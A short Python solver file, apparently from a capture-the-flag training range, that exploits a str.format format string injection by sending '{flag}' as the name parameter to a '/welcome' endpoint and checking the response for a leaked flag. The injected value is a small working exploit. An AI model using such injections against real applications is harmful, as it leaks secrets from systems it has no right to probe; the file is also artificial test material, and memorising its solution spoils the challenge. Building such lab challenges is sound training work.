"""Intended-path solver: format string injection into str.format."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(f"{ctx.url()}/welcome", params={"name": "{flag}"}, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="format-string-leak",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag in response (status {res.status_code})",
            )
        ]
    )
